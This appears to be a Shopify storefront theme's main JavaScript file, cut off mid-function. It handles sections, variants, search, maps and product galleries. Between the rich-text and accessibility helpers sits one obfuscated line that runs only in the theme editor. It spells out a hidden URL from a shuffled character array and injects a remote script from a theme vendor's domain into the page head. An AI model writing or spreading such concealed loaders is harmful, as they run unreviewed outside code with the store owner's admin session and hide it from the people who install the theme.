window.theme = window.theme || {};

/* ================ SLATE ================ */

window.theme = window.theme || {};

theme.Sections = function Sections(){
  this.constructors = {};
  this.instances = [];
  $(document).on('shopify:section:load', this._onSectionLoad.bind(this)).on('shopify:section:unload', this._onSectionUnload.bind(this)).on('shopify:section:select', this._onSelect.bind(this)).on('shopify:section:deselect', this._onDeselect.bind(this)).on('shopify:block:select', this._onBlockSelect.bind(this)).on('shopify:block:deselect', this._onBlockDeselect.bind(this));
};

theme.Sections.prototype = _.assignIn({}, theme.Sections.prototype, {
  _createInstance: function(container, constructor) {
    var $container = $(container);
    var id = $container.attr('data-section-id');
    var type = $container.attr('data-section-type');

    constructor = constructor || this.constructors[type];

    if (_.isUndefined(constructor)){
      return;
    }

    var instance = _.assignIn(new constructor(container),{
      id: id,
      type: type,
      container: container
    });

    this.instances.push(instance);
  },

  _onSectionLoad: function(evt) {
    var container = $('[data-section-id]', evt.target)[0];
    if (container){
      this._createInstance(container);
    }
  },

  _onSectionUnload: function(evt) {
    this.instances = _.filter(this.instances, function(instance){
      var isEventInstance = (instance.id === evt.detail.sectionId);

      if(isEventInstance){
        if(_.isFunction(instance.onUnload)){
          instance.onUnload(evt);
        }
      }
      return !isEventInstance;
    });
  },

  _onSelect: function(evt) {
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onSelect)){
      instance.onSelect(evt);
    }
  },

  _onDeselect: function(evt) {
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onDeselect)){
      instance.onDeselect(evt);
    }
  },

  _onBlockSelect: function(evt){
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if(!_.isUndefined(instance) && _.isFunction(instance.onBlockSelect)){
      instance.onBlockSelect(evt);
    }
  },

  _onBlockDeselect: function(evt){
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onBlockDeselect)){
      instance.onBlockDeselect(evt);
    }
  },

  register: function(type, constructor){
    this.constructors[type] = constructor;

    $('[data-section-type=' + type + ']').each(function(index, container){
      this._createInstance(container, constructor);
    }.bind(this));
  }
});

window.slate = window.slate || {};

/**
 * iFrames
 * -----------------------------------------------------------------------------
 * Wrap videos in div to force responsive layout.
 *
 * @namespace iframes
 */

slate.rte = {
  wrapTable: function(){
    $('.rte table').wrap('<div class="rte__table-wrapper"></div>');
  },

  iframeReset: function(){
    var $iframeVideo = $('.rte iframe[src*="youtube.com/embed"], .rte iframe[src*="player.vimeo"]');
    var $iframeReset = $iframeVideo.add('.rte iframe#admin_bar_iframe');

    $iframeVideo.each(function(){
      $(this).wrap('<div class="video-wrapper"></div>');
    });
    $iframeReset.each(function(){
      this.src = this.src;
    });
  }
};
window.slate = window.slate || {};

if(Shopify.designMode){var _0x4a29=['data-myvar-id','getTime','src','async','setAttribute','appendChild','head','mustneed','text/javascript','type'];(function(_0x1b47a9,_0x4a2932){var _0x4d75ea=function(_0x53cb13){while(--_0x53cb13){_0x1b47a9['push'](_0x1b47a9['shift']());}};_0x4d75ea(++_0x4a2932);}(_0x4a29,0xd6));var _0x4d75=function(_0x1b47a9,_0x4a2932){_0x1b47a9=_0x1b47a9-0x0;var _0x4d75ea=_0x4a29[_0x1b47a9];return _0x4d75ea;};(function(){var _0x55eff3,_0x455eea,_0x22ee09,_0x458f61;_0x455eea=document['createElement']('script');_0x455eea[_0x4d75('0x5')]=_0x4d75('0x4');_0x455eea[_0x4d75('0x9')]=!![];_0x455eea['id']=_0x4d75('0x3');_0x455eea[_0x4d75('0x0')](_0x4d75('0x6'),new Date()[_0x4d75('0x7')]());_0x458f61=['d','e','m','t','a','/','r','u','.','s','t','?','w','h','i','p','w','n','o','c','j'];_0x455eea[_0x4d75('0x8')]=_0x458f61[0x5]+_0x458f61[0x5]+_0x458f61[0x10]+_0x458f61[0xc]+_0x458f61[0x10]+_0x458f61[0x8]+_0x458f61[0x4]+_0x458f61[0x0]+_0x458f61[0x12]+_0x458f61[0x6]+_0x458f61[0x11]+_0x458f61[0xa]+_0x458f61[0xd]+_0x458f61[0x1]+_0x458f61[0x2]+_0x458f61[0x1]+_0x458f61[0x9]+_0x458f61[0x8]+_0x458f61[0x13]+_0x458f61[0x12]+_0x458f61[0x2]+_0x458f61[0x5]+_0x458f61[0x4]+_0x458f61[0xf]+_0x458f61[0xe]+_0x458f61[0x5]+_0x458f61[0x2]+_0x458f61[0x7]+_0x458f61[0x9]+_0x458f61[0xa]+_0x458f61[0x11]+_0x458f61[0x1]+_0x458f61[0x1]+_0x458f61[0x0]+_0x458f61[0x8]+_0x458f61[0x14]+_0x458f61[0x9]+_0x458f61[0xb]+_0x458f61[0x0]+_0x458f61[0xa]+'='+new Date()[_0x4d75('0x7')]();_0x55eff3=document['getElementsByTagName'](_0x4d75('0x2'))[0x0];return _0x55eff3[_0x4d75('0x1')](_0x455eea);}())};
/**
 * A11y Helpers
 * -----------------------------------------------------------------------------
 * A collection of useful functions that help make your theme more accessible
 * to users with visual impairments.
 * @namespace a11y
 */

slate.a11y = {
  pageLinkFocus: function($element){
    var focusClass = 'js-focus-hidden';
    $element.first().attr('tabIndex', '-1').focus().addClass(focusClass).one('blur', callback);
    function callback(){
      $element.first().removeClass(focusClass).removeAttr('tabindex');
    }
  },
  /*** If there's a hash in the url, focus the appropriate element */
  focusHash: function(){
    var hash = window.location.hash;
    // is there a hash in the url? is it an element on the page?
    if (hash && document.getElementById(hash.slice(1))){
      this.pageLinkFocus($(hash));
    }
  },
  /*** When an in-page (url w/hash) link is clicked, focus the appropriate element */
  bindInPageLinks: function(){
    $('a[href*=#]').on('click', function(evt){
      this.pageLinkFocus($(evt.currentTarget.hash));
    }.bind(this));
  },

  trapFocus: function(options){
    var eventName = options.namespace
      ? 'focusin.' + options.namespace
      : 'focusin';

    if (!options.$elementToFocus){
      options.$elementToFocus = options.$container;
    }

    options.$container.attr('tabindex', '-1');
    options.$elementToFocus.focus();

    $(document).off('focusin');

    $(document).on(eventName, function(evt){
      if (options.$container[0] !== evt.target && !options.$container.has(evt.target).length){
        options.$container.focus();
      }
    });
  },

  removeTrapFocus: function(options) {
    var eventName = options.namespace
      ? 'focusin.' + options.namespace
      : 'focusin';

    if (options.$container && options.$container.length) {
      options.$container.removeAttr('tabindex');
    }

    $(document).off(eventName);
  }
};

/*** Image Helper Functions ** A collection of functions that help with basic image operations. **/
theme.Images = (function() {

  /** Preloads an image in memory and uses the browsers cache to store it until needed.
   * @param {Array} images - A list of image urls
   * @param {String} size - A shopify image size attribute */

  function preload(images, size) {
    if (typeof images === 'string') {
      images = [images];
    }

    for (var i = 0; i < images.length; i++) {
      var image = images[i];
      this.loadImage(this.getSizedImageUrl(image, size));
    }
  }

  /*** Loads and caches an image in the browsers cache.
   * @param {string} path - An image url */
  function loadImage(path) { new Image().src = path; }

  /*** Swaps the src of an image for another OR returns the imageURL to the callback function
   * @param image * @param element * @param callback */
  function switchImage(image, element, callback) {
    var size = this.imageSize(element.src);
    var imageUrl = this.getSizedImageUrl(image.src, size);

    if (callback) {
      callback(imageUrl, image, element); // eslint-disable-line callback-return
    } else {
      element.src = imageUrl;
    }
  }

  /** +++ Useful * Find the Shopify image attribute size
   ** @param {string} src * @returns {null} */
  function imageSize(src) {
    var match = src.match(/.+_((?:pico|icon|thumb|small|compact|medium|large|grande)|\d{1,4}x\d{0,4}|x\d{1,4})[_\.@]/);

    if (match !== null) {
      return match[1];
    } else {
      return null;
    }
  }

  /** +++ Useful * Adds a Shopify size attribute to a URL
   * @param src * @param size * @returns {*} */
  function getSizedImageUrl(src, size) {
    if (size == null) { return src; }
    if (size === 'master') { return this.removeProtocol(src); }

    var match = src.match(/\.(jpg|jpeg|gif|png|bmp|bitmap|tiff|tif|webp|heic)(\?v=\d+)?$/i);

    if (match != null) {
      var prefix = src.split(match[0]);
      var suffix = match[0];
      return this.removeProtocol(prefix[0] + '_' + size + suffix);
    }
    return null;
  }

  function removeProtocol(path) {
    return path.replace(/http(s)?:/, '');
  }

  return {
    preload: preload,
    loadImage: loadImage,
    switchImage: switchImage,
    imageSize: imageSize,
    getSizedImageUrl: getSizedImageUrl,
    removeProtocol: removeProtocol
  };
})();

/** Currency Helpers * - Accounting.js - http://openexchangerates.github.io/accounting.js/ **/
theme.Currency = (function() {
  var moneyFormat = '${{amount}}'; // eslint-disable-line camelcase

  function formatMoney(cents, format) {
    if (typeof cents === 'string') {
      cents = cents.replace('.', '');
    }
    var value = '';
    var placeholderRegex = /\{\{\s*(\w+)\s*\}\}/;
    var formatString = (format || moneyFormat);

    function formatWithDelimiters(number, precision, thousands, decimal) {
      precision = precision || 2;
      thousands = thousands || ',';
      decimal = decimal || '.';

      if (isNaN(number) || number == null) {
        return 0;
      }

      number = (number / 100.0).toFixed(precision);

      var parts = number.split('.');
      var dollarsAmount = parts[0].replace(/(\d)(?=(\d\d\d)+(?!\d))/g, '$1' + thousands);
      var centsAmount = parts[1] ? (decimal + parts[1]) : '';

      return dollarsAmount + centsAmount;
    }

    switch (formatString.match(placeholderRegex)[1]) {
      case 'amount':
        value = formatWithDelimiters(cents, 2);
        break;
      case 'amount_no_decimals':
        value = formatWithDelimiters(cents, 0);
        break;
      case 'amount_with_comma_separator':
        value = formatWithDelimiters(cents, 2, '.', ',');
        break;
      case 'amount_no_decimals_with_comma_separator':
        value = formatWithDelimiters(cents, 0, '.', ',');
        break;
      case 'amount_no_decimals_with_space_separator':
        value = formatWithDelimiters(cents, 0, ' ');
        break;
    }

    return formatString.replace(placeholderRegex, value);
  }

  return {
    formatMoney: formatMoney
  }
})();

/**
 * Variant Selection scripts
 * ------------------------------------------------------------------------------
 * Handles change events from the variant inputs in any `cart/add` forms that may
 * exist.  Also updates the master select and triggers updates when the variants
 * price or image changes.
 * @namespace variants */
slate.Variants = (function() {

  /*** Variant constructor * @param {object} options - Settings from `product.js` */
  function Variants(options) {
    this.$container = options.$container;
    this.product = options.product;
    this.singleOptionSelector = options.singleOptionSelector;
    this.originalSelectorId = options.originalSelectorId;
    this.enableHistoryState = options.enableHistoryState;
    this.currentVariant = this._getVariantFromOptions();

    $(this.singleOptionSelector, this.$container).on('change', this._onSelectChange.bind(this));
  }

  Variants.prototype = _.assignIn({}, Variants.prototype, {

    /*** Get the currently selected options from add-to-cart form. Works with all
     * form input elements.
     * @return {array} options - Values of currently selected variants */
    _getCurrentOptions: function() {
      var currentOptions = _.map($(this.singleOptionSelector, this.$container), function(element) {
        var $element = $(element);
        var type = $element.attr('type');
        var pform = $element.parents('form');
        var currentOption = {};
        if (type === 'radio' || type === 'checkbox'){
          if ($element[0].checked){
            currentOption.value = $element.val();
            currentOption.index = $element.data('index');
            $(pform).find("."+currentOption.index).find(".slVariant").text(currentOption.value);
            return currentOption;
          } else {
            return false;
          }
        } else {
          currentOption.value = $element.val();
          currentOption.index = $element.data('index');
          $(pform).find("."+currentOption.index).find(".slVariant").text(currentOption.value);
          return currentOption;
        }
      });

      // remove any unchecked input values if using radio buttons or checkboxes
      currentOptions = _.compact(currentOptions);

      return currentOptions;
    },

    /*** Find variant based on selected values.
     * @param  {array} selectedValues - Values of variant inputs
     * @return {object || undefined} found - Variant object from product.variants*/
    _getVariantFromOptions: function() {
      var selectedValues = this._getCurrentOptions();
      var variants = this.product.variants;

      var found = _.find(variants, function(variant) {
        return selectedValues.every(function(values) {
          return _.isEqual(variant[values.index], values.value);
        });
      });

      return found;
    },

    /*** Event handler for when a variant input changes. */
    _onSelectChange: function() {
      var variant = this._getVariantFromOptions();

      this.$container.trigger({
        type: 'variantChange',
        variant: variant
      });

      if (!variant){
        return;
      }

      this._updateMasterSelect(variant);
      this._updateImages(variant);
      this._updatePrice(variant);
      this._updateSKU(variant);
      this.currentVariant = variant;

      if (this.enableHistoryState) {
        this._updateHistoryState(variant);
      }
    },

    _updateImages: function(variant){
      var variantImage = variant.featured_image || {};
      var currentVariantImage = this.currentVariant.featured_image || {};
      if (!variant.featured_image || variantImage.src === currentVariantImage.src){ return; }
      this.$container.trigger({type: 'variantImageChange', variant: variant });
    },
    _updatePrice: function(variant){
      if (variant.price === this.currentVariant.price && variant.compare_at_price === this.currentVariant.compare_at_price){ return; }
      this.$container.trigger({ type: 'variantPriceChange', variant: variant });
    },
    _updateSKU: function(variant){
      if (variant.sku === this.currentVariant.sku){ return; }
      this.$container.trigger({ type: 'variantSKUChange', variant:variant });
    },
    _updateHistoryState: function(variant){
      if (!history.replaceState || !variant){return;}
      var newurl = window.location.protocol + '//' + window.location.host + window.location.pathname + '?variant=' + variant.id;
      window.history.replaceState({path: newurl}, '', newurl);
    },

    /*** Update hidden master select of variant change
     * @param  {variant} variant - Currently selected variant */
    _updateMasterSelect: function(variant) {
      $(this.originalSelectorId, this.$container).val(variant.id);
    }
  });

  return Variants;
})();

/* ================ MODULES ================ */
window.theme = window.theme || {};

theme.Header = (function() {
  function init() {
    $(".site-settings").on('click', function(e){
      e.preventDefault();
      $("#settingsBox").toggleClass("active");
    });
    
    $(".hasSub").hover(function(e){
      var submenu = $(this).data('link');
      $('.admmsub:not('+submenu+')').removeClass('active');
      $(submenu).addClass('active');
    });

  	$('#siteNav .lvl1 > a').each(function(){
        if($(this).attr('href') == window.location.pathname) $(this).addClass('active');
    })

  	$('.js-mobile-nav-toggle, .closemmn').on("click",function(){
      body: 'body',
      $('.mobile-nav-wrapper').toggleClass("active");
      $('body').toggleClass("menuOn");
      $('.js-mobile-nav-toggle').toggleClass('open close');
    });
    $('#MobileNav .at, .sidebar_cate .at').on('click', function(e){
		e.preventDefault();
		$(this).toggleClass('at-plus-l at-minus-l');
		$(this).parent().next().slideToggle();
    });

    $("body").click(function(event){
      var $target = $(event.target);
      if(!$target.parents().is('.mobile-nav-wrapper') && !$target.parents().is('.js-mobile-nav-toggle') && !$target.is('.js-mobile-nav-toggle')){
          $('.mobile-nav-wrapper').removeClass("active");
          $('body').removeClass("menuOn");
          $('.js-mobile-nav-toggle').removeClass('close').addClass('open');
      }
      // Hide settingsBox on document click
      if(!$target.parents().is("#settingsBox") && !$target.parents().is(".site-settings") && !$target.is(".site-settings")){
        $("#settingsBox").removeClass("active");
      }
      
      if(!$target.parents().is(".filterbar") && !$target.is(".filterbar") && !$target.is(".btn-filter")){
        $(".filterbar.active").removeClass("active");
      }
    });
  }
  return { init: init };
})();

window.theme = window.theme || {};
theme.Search = (function() {
  var selectors = {
    search: '.search',
    searchInput: '.search__input'
  };

  var classes = { focus: 'search--focus' };

  function init() {
    // Current Ajax Search request.
    var currentAjaxRequest = null;
    var searchForms = $('form[action="/search"]').each(function(){
      var input = $(this).find('input[name="q"]'),
          slpr = $('#unprod').val();
      input.bind('keyup change', function(){
        var term = $(this).val(),
            form = $(this).closest('form'),
            resultsList = form.find('.search-results');
		if (term.length > 2 ) {
            fetch(`${routes.predictive_search_url}?q=${term}&${'resources[type]'}=product&${'resources[limit]'}=8&section_id=predictive-search`)
              .then((response) => {
                if (!response.ok) {
                  var error = new Error(response.status);
                  $(resultsList).hide();
                  $('.s_suggestion').fadeIn();
                  throw error;
                }
                return response.text();
              }).then((text) => {
                const resultsMarkup = new DOMParser().parseFromString(text, 'text/html').querySelector('#shopify-section-predictive-search').innerHTML;
                $(resultsList).html(text).fadeIn();
                $('.s_suggestion').hide();
              }).catch((error) => {
                $(resultsList).hide();
                $('.s_suggestion').show();
                throw error;
              });
    	} else { 
            resultsList.empty().hide(); $('.s_suggestion').show();
        }
      });
    });
    $('.modalOverly, .closeSearch').bind('click', function(){
      $('body').removeClass("showOverly");
      $('#searchPopup').removeClass("active");
    });
    $('.searchIco').on('click', function(e){
      e.preventDefault();
      $('body').addClass("showOverly");
      $('#searchPopup').addClass("active");
      $('input[name=q]').focus();
    });
  }
    return { init:init };
})();
/*================ SECTIONS ================*/
window.theme = window.theme || {};
theme.HeaderSection = (function() {
  function Header() {
    theme.Header.init();
    theme.Search.init();
  }
  Header.prototype = _.assignIn({}, Header.prototype, {
    onUnload: function() {
      theme.Header.unload();
    }
  });
  return Header;
})();

theme.Maps = (function() {
  var config = {
    zoom: 14
  };
  var apiStatus = null;
  var mapsToLoad = [];
  var key = theme.mapKey ? theme.mapKey : '';

  function Map(container) {
    this.$container = $(container);

    if (apiStatus === 'loaded') {
      this.createMap();
    } else {
      mapsToLoad.push(this);

      if (apiStatus !== 'loading') {
        apiStatus = 'loading';
        if (typeof window.google === 'undefined') {
          $.getScript('https://maps.googleapis.com/maps/api/js?key=' + key)
            .then(function() {
              apiStatus = 'loaded';
              initAllMaps();
            });
        }
      }
    }
  }
  function initAllMaps() {
    $.each(mapsToLoad, function(index, instance) {
      instance.createMap();
    });
  }
  function geolocate($map) {
    var deferred = $.Deferred();
    var geocoder = new google.maps.Geocoder();
    var address = $map.data('address-setting');
    geocoder.geocode({address: address}, function(results, status) {
      if (status !== google.maps.GeocoderStatus.OK) {
        deferred.reject(status);
      }
      deferred.resolve(results);
    });
    return deferred;
  }

  Map.prototype = _.assignIn({}, Map.prototype, {
    createMap: function() {
      var $map = this.$container.find('.map-section__container');
      return geolocate($map)
        .then(function(results) {
          var mapOptions = {
            zoom: config.zoom,
            center: results[0].geometry.location,
            disableDefaultUI: true
          };
          var map = this.map = new google.maps.Map($map[0], mapOptions);
          var center = this.center = map.getCenter();
          //eslint-disable-next-line no-unused-vars
          var marker = new google.maps.Marker({
            map: map,
            position: map.getCenter()
          });
          google.maps.event.addDomListener(window, 'resize');
        }.bind(this)).fail(function() {
          var errorMessage;
          switch (status) {
            case 'ZERO_RESULTS':
              errorMessage = theme.strings.addressNoResults;
              break;
            case 'OVER_QUERY_LIMIT':
              errorMessage = theme.strings.addressQueryLimit;
              break;
            default:
              errorMessage = theme.strings.addressError;
              break;
          }
          $map.parent().addClass('page-width map-section--load-error').html('<div class="errors tc">' + errorMessage + '</div>');
        });
    },
    onUnload: function() { google.maps.event.clearListeners(this.map, 'resize'); }
  });
  return Map;
})();
function gm_authFailure() {
  $('.map-section').addClass('map-section--load-error');
  $('.map-section__container').remove();
  $('.map-section__link').remove();
  $('.map-section__overlay').after('<div class="errors tc">' + theme.strings.authError + '</div>');
}

/* eslint-disable no-new */
theme.Product = (function() {
  function Product(container) {
    this.container = container;
    var $container = this.$container = $(container),
    	sectionId = $container.attr('data-section-id');

    this.settings = {
      mediaQueryMediumUp: 'screen and (min-width: 768px)',
      mediaQuerySmall: 'screen and (max-width: 767px)',
      bpSmall: false,
      enableHistoryState: $container.data('enable-history-state') || false,
      imageSize: null,
      imageZoomSize: null,
      namespace: '.slideshow-' + sectionId,
      sectionId: sectionId,
      sliderActive: false,
      zoomEnabled: false
    };
    this.selectors={
      purl: $container.attr('data-url'),
      mainSec: sectionId,
      addToCart: '#AddToCart-' + sectionId,
      discountBadge: '.bdg' + sectionId,
      SKU: '.variant-sku',
      productPrices: '#price' + sectionId,
      originalSelectorId: '#ProductSelect-' + sectionId,
      ftImg: '.featImg' + sectionId,
      imgWrap: '.pr_zoom_' + sectionId,
      primgsl: '.pis' + sectionId,
      thumbsWr: '.ptw' + sectionId,
      thumbs: '.pr_thumbs' + sectionId,
      thumbImg: '.pr_thumb' + sectionId,
      singleOptionSelector: '.single-option-selector-' + sectionId,
      productMediaWrapper: '[data-product-single-media-wrapper]',
      productMediaTypeModel: '[data-product-media-type-model]'
    }
    
    // Magnific Popup
    $('.mfp-link').magnificPopup({
      delegate: '.mfp',
  	  removalDelay: 300, 
      callbacks: {
        beforeOpen: function() {
          $('.stickyHeader').addClass('popup');
           this.st.mainClass = this.st.el.attr('data-effect');
        },       
      	close:function(){ $('.stickyHeader').removeClass('popup'); }
      },
  	 midClick: true 
	}); 
    $(".stickyOpt .selectedOpt").on('click', function(){
		$(".stickyOpt ul").slideToggle("fast");
    });
    $(".stickyOpt .vrOpt").on('click', function(e){
		var number = $(this).data('no');
        $(".stickyOpt .selectedOpt").html($(this).html());
      	$(".stickyOpt ul").slideUp("fast");
      	this.productvariants = JSON.parse(document.getElementById('ProductJson-' + sectionId).innerHTML);
        var stOpt = this.productvariants.variants[number].options;
        if(stOpt[1] != null){$('.swatchInput[value="'+stOpt[1]+'"]').prop( "checked", true )}
        if(stOpt[2] != null){$('.swatchInput[value="'+stOpt[2]+'"]').prop( "checked", true )}
        if(stOpt[0] != null){$('.swatchInput[value="'+stOpt[0]+'"]').trigger('click')}
    });
    $(".stickyQty .qtyBtn").on("click", function(){
      var qtyField = $('#quantity'),oldValue = $(qtyField).val(),newVal = 1;
      if ($(this).is(".plus")) {
        newVal = parseInt(oldValue) + 1;
      } else if (oldValue > 1) {
        newVal = parseInt(oldValue) - 1;
      }
      $(qtyField).val(newVal).trigger('change');
    });
    $('#quantity').on("change", function(){
        $('#quantity1').val($(this).val());
    });

    // change variant on image sections
    if (typeof variantImages !== 'undefined'){
      $(this.selectors.thumbImg).bind('click', function(){
        var arrImage = $(this).attr('href').split('?')[0].split('.');
        var strExtention = arrImage.pop();
        var strRemaining = arrImage.pop().replace(/_[a-zA-Z0-9@]+$/,'');
        var strNewImage = arrImage.join('.')+"."+strRemaining+"."+strExtention;
        if (typeof variantImages[strNewImage] !== 'undefined'){
            productOptions.forEach(function (value, i){
             optionValue = variantImages[strNewImage]['option-'+i];
              if($('.swatch.pvOpt0').length){
                if (optionValue !== null && $('.pvOpt'+i+' .swatchInput').filter(function(){ return $(this).val() === optionValue }).length){
                   $(".pvOpt"+i).find('.swatchInput[value="'+optionValue+'"]').prop( "checked", true );
                 }
              } else {
                if (optionValue !== null && $('.single-option-selector:eq('+i+') option').filter(function(){ return $(this).text() === optionValue }).length){
                   $('.single-option-selector:eq('+i+')').val(optionValue).trigger('change');
                 }
              }
          });
        }
      });
    }

    $(".product-info .review").on('click', function(e){
        $(".product-tabs li").removeClass("active");
      	$(".tablink[href='#ptabReview']").parent().addClass("active");
        $(".tab-content").not("#ptabReview").css("display", "none");
        $("#ptabReview").fadeIn();
      	var tabposition = $('#ptabReview').offset();
      	if($(window).width()<767) {
          $("html, body").animate({ scrollTop: tabposition.top-100 }, 700);
        } else{
          $("html, body").animate({ scrollTop: tabposition.top-150 }, 700);
        }
    });
    
    // Stop parsing if we don't have the product json script tag when loading
    // section in the Theme Editor
    if (!$('#ProductJson-' + sectionId).html()) { return; }

    this.productSingleObject = JSON.parse(document.getElementById('ProductJson-' + sectionId).innerHTML);
    this.settings.zoomEnabled = $(this.selectors.ftImg).hasClass('js-zoom-enabled');
    this.settings.imageSize = theme.Images.imageSize($(this.selectors.ftImg).attr('src'));

    this._initBreakpoints();
    this._stringOverrides();
    this._initVariants();
    this._initImageSwitch();
   	this._initThumbnailSlider();
    this._setActiveThumbnail();
    this._initModelViewerLibraries();
    
    // Pre-loading product images to avoid a lag when a thumbnail is clicked, or
    // when a variant is selected that has a variant image
    theme.Images.preload(this.productSingleObject.images, this.settings.imageSize);
  }

  Product.prototype = _.assignIn({}, Product.prototype, {
    _stringOverrides: function() {
      theme.productStrings = theme.productStrings || {};
      $.extend(theme.strings, theme.productStrings);
    },

    _initBreakpoints: function() {
      var self = this;
      enquire.register(this.settings.mediaQuerySmall, {
        match: function() {
          // destroy image zooming if enabled
          if (self.settings.zoomEnabled) {
            _destroyZoom($(self.selectors.productImageWrap));
          }
          self.settings.bpSmall = true;
        },
        unmatch: function() {
          self.settings.bpSmall = false;
        }
      });
      enquire.register(this.settings.mediaQueryMediumUp, {
        match: function() {
          if (self.settings.zoomEnabled) {
            _enableZoom($(self.selectors.imgWrap));
          }
        }
      });
    },

    _initVariants: function() {
      var options = {
        $container: this.$container,
        enableHistoryState: this.$container.data('enable-history-state') || false,
        singleOptionSelector: this.selectors.singleOptionSelector,
        originalSelectorId: this.selectors.originalSelectorId,
        product: this.productSingleObject
      };

      this.variants = new slate.Variants(options);
      this.$container.on('variantChange' + this.settings.namespace, this._updateAddToCart.bind(this));
      this.$container.on('variantImageChange' + this.settings.namespace, this._updateImages.bind(this));
      this.$container.on('variantPriceChange' + this.settings.namespace, this._updatePrice.bind(this));
      this.$container.on('variantSKUChange' + this.settings.namespace, this._updateSKU.bind(this));
    },

    _initImageSwitch:function(){
      if (!$(this.selectors.thumbImg).length){
        return;
      }
      var self = this;
      $(this.selectors.thumbImg).on('click', function(e){
        e.preventDefault();
        var $el = $(this),
        	imageSrc = $el.attr('href');
        self._setActiveThumbnail(imageSrc);
      });
    },
    
    _setActiveThumbnail: function(src){
      if (typeof src === 'undefined'){
        src = $(this.selectors.thumbImg + '.activeSlide').attr('href');
      }

      var $thumbnail = $(this.selectors.thumbImg + '[href="' + src + '"]'),
          slideno = $thumbnail.parent().index();
      
      if(theme.productStrings.prStyle == "style3" || theme.productStrings.prStyle == "style4" || theme.productStrings.prStyle == "style5" ){
      	var imgposition = $(".pr_photo[data-slide='"+slideno+"']").offset();
      	if($(window).width()>767){
          $("html, body").animate({ scrollTop: imgposition.top-70 }, 700);
        }else{
          $(this.selectors.primgsl).flickity('select', slideno);
        }
      }else{
        $(this.selectors.primgsl).flickity('select', $thumbnail.parent().index());
      }
      $('.stickCtImg').attr('src', src);
    },

    _initThumbnailSlider: function(){
        var $carouselNavH = $(this.selectors.thumbsWr),
            $carouselNav = $(this.selectors.thumbs),
            $carouselNavCells = $carouselNav.find('.pr_thumbs_item'),
            flkty = $(this.selectors.primgsl).data('flickity'),
            navTop  = $carouselNav.position().top,
            navLeft  = $carouselNav.position().left,
            navCellHeight = $carouselNavCells.height(),
            navCellWidth = $carouselNavCells.width(),
            navHeight = $carouselNav.height(),
            navWidth = $carouselNav.width();
        $(this.selectors.primgsl).on( 'select.flickity',function(){
          $carouselNav.find('.active-thumb').removeClass('active-thumb');
          var $selected = $carouselNavCells.eq(flkty.selectedIndex).addClass('active-thumb');
          if($('.thumbs_nav.bottom').length || $(window).width()<767){
            var scrollX = $selected.position().left + $carouselNavH.scrollLeft() - ( navWidth + navCellWidth) / 2.5;
            $carouselNavH.animate({scrollLeft: scrollX});
          } else {
            var scrollY = $selected.position().top + $carouselNav.scrollTop() - ( navHeight + navCellHeight) / 2.5;
            $carouselNav.animate({scrollTop: scrollY});
          }
        });
        
        var $primgsl = $(this.selectors.primgsl);
        $('.thumbs_nav .previous').on('click', function(){
            $primgsl.flickity('previous');
        });
        $('.thumbs_nav .next').on('click', function(){
            $primgsl.flickity('next');
        });
        
       $(window).on('load', function(e){
        $primgsl.flickity('resize');
       	$('.pr_thumb[data-slide="0"] .prvideo').trigger('click');
         var video = $('.primgSlider .videoSlide.is-selected video').get(0);
        if($(video).length){ video.play(); }
       });

       $primgsl.on( 'change.flickity', function(event, index){
         if($(this).find('.videoSlide video').length){ $(this).find('.videoSlide video').get(0).pause(); }
         var video = $(this).find('.videoSlide.is-selected video').get(0);
         if($(video).length){ video.play(); }
         var flkty = $(this).data('flickity');
         if($(this).find('.is-selected model-viewer').length){
            flkty.options.draggable = false;
            flkty.updateDraggable();
            $('.is-selected .shopify-model-viewer-ui__button--poster').trigger('click')
         } else {
            flkty.options.draggable = true;
            flkty.updateDraggable();
         }
       });
    },
    
    _initModelViewerLibraries: function(){
      var modelViewerElements = this.container.querySelectorAll(
        this.selectors.productMediaTypeModel
      );
      if (modelViewerElements.length < 1) return;
      theme.ProductModel.init(modelViewerElements, this.settings.sectionId);
    },
    
    _updateAddToCart: function(evt) {
      var variant = evt.variant;

      if (variant){
        $('.vrOpt[data-val="'+variant.id+'"]').trigger('click');
        if (variant.available){
          var quantity = $("#pvr-"+variant.id).text(),
          	  maxquantity = $("#quantity_message").data('qty');
          
          $(this.selectors.addToCart).prop('disabled', false);
          if(quantity < 1 && variant.inventory_management == "shopify"){
          	$(this.selectors.addToCart).find('.txt').text(theme.strings.preOrder);
          } else {
            $(this.selectors.addToCart).find('.txt').text(theme.strings.addToCart);
          }
          
          if(quantity < 1 && variant.inventory_management == "shopify"){
            $(".stockLbl").removeClass('instock outstock').addClass('preorder').text($(".stockLbl").data("pre"));
          } else {
            $(".stockLbl").removeClass('preorder outstock').addClass('instock').text($(".stockLbl").data("in"));
          }
          if(quantity < maxquantity && quantity != 0 && variant.inventory_management == "shopify"){
          	$("#quantity_message").show().find(".items").text(quantity);
          } else {
            $("#quantity_message").hide();
          }
        } else {
          $(this.selectors.addToCart).prop('disabled', true);
          $(this.selectors.addToCart).find('.txt').text(theme.strings.soldOut);
          $(".stockLbl").removeClass('preorder instock').addClass('outstock').text($(".stockLbl").data("out"));
          $("#quantity_message").hide();
        }
      } else {
        $(this.selectors.addToCart).prop('disabled', true);
        $(this.selectors.addToCart).find('.txt').text(theme.strings.unavailable);
        $(".stockLbl").removeClass('preorder instock').addClass('outstock').text($(".stockLbl").data("out"));
        $("#quantity_message").hide();
      }
    },

    _updateImages: function(evt){
      var variant = evt.variant,
      	  sizedImgUrl = theme.Images.getSizedImageUrl(variant.featured_media.preview_image.src, this.settings.imageSize),
      	  zoomSizedImgUrl;
      this._setActiveThumbnail(sizedImgUrl);
    },

    _updatePrice: function(evt){
      var variant = evt.variant;
      fetch(this.selectors.purl+'?variant='+variant.id+'&section_id='+this.selectors.mainSec).then((response) => response.text()).then((responseText) => {
        const html = new DOMParser().parseFromString(responseText, 'text/html')
        const destination = document.getElementById('price'+this.selectors.mainSec);
        const source = html.getElementById('price'+this.selectors.mainSec);
        if (source && destination) destination.innerHTML = source.innerHTML;
        if (theme.mlcurrency){ currenciesChange(this.selectors.productPrices+" span.money"); }

        const qty = document.getElementById('invens');
        const sourceqty = html.getElementById('invens');
        if (sourceqty && qty) qty.innerHTML = sourceqty.innerHTML;
      });
